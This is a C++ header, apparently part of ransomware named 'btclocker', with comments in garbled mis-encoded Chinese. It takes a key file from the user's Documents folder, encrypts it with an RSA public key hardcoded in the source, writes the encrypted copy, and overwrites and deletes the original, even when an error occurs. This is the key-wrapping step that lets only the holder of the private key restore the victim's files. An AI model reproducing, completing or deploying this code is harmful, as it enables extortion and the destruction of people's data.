#pragma once
#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <fstream>
#include<wincrypt.h>
#include <vector>
#include <ShlObj.h>
#include <filesystem>
#include <stdexcept>
#include <sstream>
#include <algorithm>
#include"crypt.h"
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;

// Ӳ����Ĺ�ԿPEM�ַ���
const char* HARDCODED_PUBLIC_KEY =
"-----BEGIN PUBLIC KEY-----\n"
"UlNBMQAQAAADAAAAAAIAAAAAAAAAAAAAAQAB3gNKEg8SvyFZTIvszXIJ89FcQnfA\n"
"9ChE6A5DOxS79EcF76NU3rNCw/Q/Un/OuzUPYQ12DE+yqH5U+AH+eJpbzyOWEVdy\n"
"IriQqWDV4PSeGLEl5qc85GrNlCIXrijh+6bSsOhvsI3gsgL9Hodwhr+QN/b4983b\n"
"qORNUr0L8hd6cBc4C4marZexcV/dNGxhL5S1ULApFZqJHHM82tgTD9TVRWAsvtwf\n"
"b4EkorHIPbnXKeS2Hdeaus71bXCgflj03RXxEBAEalH2rFdkrByt8NmICQ+By1h6\n"
"qYoyGgIjCraBoXWB+LJToDm+cEmzvR5yKMzpnH+Dmxca8aOuaIkZfIrDq5TYMpsE\n"
"HVAOsHesgVwGQgAqHwU4wHBAxucTt/m8x+ZlW+zsvmDssNbHsw913bVnnzJY+WWK\n"
"eTmRo9iMagBGfz4YGl/tYfHoZWWlQBO0h1Z5mcLl6qwj5ImMe3dbWRwseB792LsA\n"
"dlvLnHynruIguxxd+KYJuj7zzOGDzV7/VdmDLjJKq2Zqg7bTVaCLEsHtg4GltxRm\n"
"QvYoSEp5s7mBrwPmyo8D0BTeIlTAUdlTRVAIVfyMzk0U9Su1e+hsNM3CAn/n0i65\n"
"hhwdC9ioOe2pi57Y6JMlBW8nVeo8n7sAFjT9S+3d6Z7u4E+LA2jQv2o/6IrvMg74\n"
"FGdx3N3oalR6HpU=\n"
"-----END PUBLIC KEY-----";

// ��ȡ�ĵ��ļ���·��
fs::path GetDocumentsPath() {
    PWSTR path = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path))) {
        fs::path result(path);
        CoTaskMemFree(path);
        return result;
    }
    throw std::runtime_error("Failed to get Documents folder path");
}

// ��Ӳ�����PEM�ַ������빫Կ
BCRYPT_KEY_HANDLE ImportPublicKeyFromHardcoded() {
    std::string pemKey = HARDCODED_PUBLIC_KEY;

    // ���PEM��ʽ�Ƿ���Ч
    if (pemKey.find("-----BEGIN PUBLIC KEY-----") == std::string::npos) {
        throw std::runtime_error("Invalid PEM format: missing BEGIN header");
    }

    // ��ȡBase64���֣�ȥ��ͷβ�ͻ��з���
    std::string base64Data;
    bool inBody = false;
    std::istringstream iss(pemKey);
    std::string line;

    while (std::getline(iss, line)) {
        if (line.find("-----BEGIN PUBLIC KEY-----") != std::string::npos) {
            inBody = true;
            continue;
        }
        if (line.find("-----END PUBLIC KEY-----") != std::string::npos) {
            inBody = false;
            break;
        }
        if (inBody) {
            base64Data += line;
        }
    }

    // Base64����
    DWORD binarySize = 0;
    if (!CryptStringToBinaryA(
        base64Data.c_str(),
        static_cast<DWORD>(base64Data.length()),
        CRYPT_STRING_BASE64,
        nullptr,
        &binarySize,
        nullptr,
        nullptr
    )) {
        DWORD err = GetLastError();
        std::ostringstream oss;
        oss << "CryptStringToBinaryA (size) failed. Error: " << err;
        throw std::runtime_error(oss.str());
    }

    std::vector<BYTE> binaryKey(binarySize);
    if (!CryptStringToBinaryA(
        base64Data.c_str(),
        static_cast<DWORD>(base64Data.length()),
        CRYPT_STRING_BASE64,
        binaryKey.data(),
        &binarySize,
        nullptr,
        nullptr
    )) {
        DWORD err = GetLastError();
        std::ostringstream oss;
        oss << "CryptStringToBinaryA (decode) failed. Error: " << err;
        throw std::runtime_error(oss.str());
    }

    // ��RSA�㷨�ṩ����
    BCRYPT_ALG_HANDLE hAlg;
    if (FAILED(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, nullptr, 0))) {
        throw std::runtime_error("BCryptOpenAlgorithmProvider failed");
    }

    // ���빫Կ
    BCRYPT_KEY_HANDLE hKey;
    NTSTATUS status = BCryptImportKeyPair(
        hAlg,
        nullptr,
        BCRYPT_RSAPUBLIC_BLOB,
        &hKey,
        binaryKey.data(),
        binarySize,
        0
    );

    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) {
        std::ostringstream oss;
        oss << "BCryptImportKeyPair failed. Status: 0x" << std::hex << status;
        throw std::runtime_error(oss.str());
    }

    return hKey;
}

// RSA���ܺ����������޸��棩
std::vector<BYTE> EncryptDataWithRSA(const std::vector<BYTE>& data, BCRYPT_KEY_HANDLE hPublicKey) {
    // ��ȡ��Կ��С���ֽڣ�
    DWORD keySizeBytes = 0;
    DWORD resultSize = 0;

    // ���ȳ��Ի�ȡ��Կǿ�ȣ����أ�
    if (FAILED(BCryptGetProperty(
        hPublicKey,
        BCRYPT_KEY_STRENGTH,
        reinterpret_cast<PUCHAR>(&keySizeBytes),
        sizeof(keySizeBytes),
        &resultSize,
        0
    ))) {
        // ���ʧ�ܣ����Ի�ȡ���С
        if (FAILED(BCryptGetProperty(
            hPublicKey,
            BCRYPT_BLOCK_LENGTH,
            reinterpret_cast<PUCHAR>(&keySizeBytes),
            sizeof(keySizeBytes),
            &resultSize,
            0
        ))) {
            throw std::runtime_error("Failed to get key properties");
        }
    }
    else {
        // ������ת��Ϊ�ֽ�
        keySizeBytes /= 8;
    }

    // �������������С��OAEP��䣩
    DWORD maxInputBlockSize = keySizeBytes - 42; // OAEP������42�ֽ�

    // ׼�����������
    std::vector<BYTE> encryptedData;

    // �ֿ����
    size_t offset = 0;
    while (offset < data.size()) {
        // ���㵱ǰ���С
        size_t currentBlockSize = std::min<size_t>(
            static_cast<size_t>(maxInputBlockSize),
            data.size() - offset
        );

        // ��ȡ���ܺ�Ĵ�С
        DWORD encryptedBlockSize = 0;
        BCRYPT_OAEP_PADDING_INFO oaepInfo = { BCRYPT_SHA1_ALGORITHM, nullptr, 0 };

        NTSTATUS status = BCryptEncrypt(
            hPublicKey,
            const_cast<BYTE*>(data.data() + offset),
            static_cast<DWORD>(currentBlockSize),
            &oaepInfo,
            nullptr,
            0,
            nullptr,
            0,
            &encryptedBlockSize,
            BCRYPT_PAD_OAEP
        );

        if (!BCRYPT_SUCCESS(status)) {
            std::ostringstream oss;
            oss << "Failed to get encrypted block size. Status: 0x" << std::hex << status;
            throw std::runtime_error(oss.str());
        }

        // ���ܵ�ǰ��
        std::vector<BYTE> encryptedBlock(encryptedBlockSize);
        DWORD bytesEncrypted = 0;

        status = BCryptEncrypt(
            hPublicKey,
            const_cast<BYTE*>(data.data() + offset),
            static_cast<DWORD>(currentBlockSize),
            &oaepInfo,
            nullptr,
            0,
            encryptedBlock.data(),
            static_cast<DWORD>(encryptedBlock.size()),
            &bytesEncrypted,
            BCRYPT_PAD_OAEP
        );

        if (!BCRYPT_SUCCESS(status)) {
            std::ostringstream oss;
            oss << "Encryption failed for block at offset " << offset
                << ". Status: 0x" << std::hex << status;
            throw std::runtime_error(oss.str());
        }

        // ��ӵ����
        encryptedData.insert(
            encryptedData.end(),
            encryptedBlock.begin(),
            encryptedBlock.begin() + bytesEncrypted
        );

        offset += currentBlockSize;
    }

    return encryptedData;
}

// ��ȫɾ���ļ�����
bool SecureDeleteFile(const fs::path& filePath, int overwritePasses = 3) {
    try {
        // ����ļ��Ƿ����
        if (!fs::exists(filePath)) {
            std::cerr << "File not found: " << filePath << std::endl;
            return false;
        }

        // ��ȡ�ļ���С
        uintmax_t fileSize = fs::file_size(filePath);

        // ���ļ����ж�д
        std::fstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
        if (!file) {
            std::cerr << "Failed to open file for secure deletion: " << filePath << std::endl;
            return false;
        }

        // ��θ����ļ�����
        for (int i = 0; i < overwritePasses; i++) {
            // �ƶ����ļ���ͷ
            file.seekp(0, std::ios::beg);

            // �����������ģʽ
            std::vector<char> randomData(fileSize);
            for (auto& byte : randomData) {
                byte = static_cast<char>(rand() % 256);
            }

            // д���������
            file.write(randomData.data(), randomData.size());
            file.flush();
        }

        // �ر��ļ�
        file.close();

        // ɾ���ļ�
        if (!fs::remove(filePath)) {
            std::cerr << "Failed to delete file: " << filePath << std::endl;
            return false;
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "SecureDeleteFile error: " << e.what() << std::endl;
        return false;
    }
}

// �����ܺ�����ʹ��Ӳ���빫Կ��
int rsaencrypt() {
    fs::path inputFile;
    size_t fileSize = 0;

    try {
        // ��ȡ�ĵ��ļ���·��
        fs::path documentsPath = GetDocumentsPath();
        inputFile = documentsPath / "btclocker_key.bin";

        // ����ļ��Ƿ����
        if (!fs::exists(inputFile)) {
            throw std::runtime_error("Input file not found: " + inputFile.string());
        }

        // ���ڴ��ж�ȡ�����ļ�
        std::ifstream inFile(inputFile, std::ios::binary | std::ios::ate);
        if (!inFile) {
            throw std::runtime_error("Failed to open input file: " + inputFile.string());
        }

        fileSize = static_cast<size_t>(inFile.tellg());
        inFile.seekg(0, std::ios::beg);

        std::vector<BYTE> fileData(fileSize);
        if (!inFile.read(reinterpret_cast<char*>(fileData.data()), fileSize)) {
            throw std::runtime_error("Failed to read input file");
        }
        inFile.close();

        // ֱ�Ӵ�Ӳ�����ַ������ع�Կ
        std::cout << "Loading hardcoded public key..." << std::endl;
        BCRYPT_KEY_HANDLE hPublicKey = ImportPublicKeyFromHardcoded();
        std::cout << "Public key imported successfully\n";

        // ��ȡ��Կ��Ϣ
        DWORD keySizeBits = 0;
        DWORD resultSize = 0;
        if (SUCCEEDED(BCryptGetProperty(
            hPublicKey,
            BCRYPT_KEY_STRENGTH,
            reinterpret_cast<PUCHAR>(&keySizeBits),
            sizeof(keySizeBits),
            &resultSize,
            0
        ))) {
            std::cout << "Key size: " << keySizeBits << " bits\n";
        }

        // ���ڴ��м�������
        std::cout << "Encrypting data in memory..." << std::endl;
        std::cout << "Input data size: " << fileData.size() << " bytes\n";

        std::vector<BYTE> encryptedData = EncryptDataWithRSA(fileData, hPublicKey);

        std::cout << "Data encrypted successfully\n";
        std::cout << "Encrypted size: " << encryptedData.size() << " bytes\n";

        // ���������ļ�
        fs::path encryptedFile = documentsPath / "btclocker_key.enc";
        std::ofstream outFile(encryptedFile, std::ios::binary);
        if (!outFile) {
            throw std::runtime_error("Failed to create output file: " + encryptedFile.string());
        }

        // д���������
        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        BCryptDestroyKey(hPublicKey);

        std::cout << "File encrypted successfully: " << encryptedFile << std::endl;
        std::cout << "Original size: " << fileSize << " bytes" << std::endl;
        std::cout << "Encrypted size: " << encryptedData.size() << " bytes" << std::endl;

        // ��ȫɾ��ԭ�ļ�
        std::cout << "Securely deleting original file: " << inputFile << std::endl;
        if (SecureDeleteFile(inputFile)) {
            std::cout << "Original file securely deleted" << std::endl;
        }
        else {
            std::cerr << "Warning: Failed to securely delete original file" << std::endl;
            // ������ͨɾ��
            if (fs::remove(inputFile)) {
                std::cout << "Original file deleted (non-secure)" << std::endl;
            }
            else {
                std::cerr << "Error: Failed to delete original file" << std::endl;
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;

        // ����ļ��Ѽ��ص�δɾ��������ɾ��
        if (fileSize > 0 && fs::exists(inputFile)) {
            std::cerr << "Attempting to delete original file due to error..." << std::endl;
            if (fs::remove(inputFile)) {
                std::cerr << "Original file deleted" << std::endl;
            }
            else {
                std::cerr << "Failed to delete original file" << std::endl;
            }
        }

        return 1;
    }

    return 0;
}